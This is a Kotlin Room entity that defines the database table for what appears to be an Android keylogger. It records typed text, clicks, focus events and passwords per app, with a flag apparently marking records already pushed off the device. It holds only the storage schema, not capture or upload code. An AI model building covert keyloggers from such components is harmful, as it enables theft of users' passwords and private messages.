package com.hawkshaw.library.datalayer.room.keylogger

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.Index
import androidx.room.PrimaryKey


@Entity(
    tableName = "keylogger",
    indices = [Index(value = ["timestamp"], unique = true)]
)
data class KeyLogEntity(
    @PrimaryKey(autoGenerate = true)
    var id: Long = 0,

    @ColumnInfo(name = "type")
    val type: Type,

    @ColumnInfo(name = "package_name")
    val packageName: String,


    @ColumnInfo(name = "message")
    val message: String, // Matches Java's private final String message;

    @ColumnInfo(name = "timestamp") // Explicitly named "timestamp" for the column
    val timestamp: Long = System.currentTimeMillis(), // Matches Java's default value in synthetic constructor

    // FIX: Add the 'pushed' column back for the DAO queries
    @ColumnInfo(name = "pushed")
    var pushed: Boolean = false // 'var' if it's updated, 'val' if it's set once
) {

    enum class Type {
        Unknown,
        TextChanged,
        ViewClicked,
        ViewFocused,
        Password
    }
}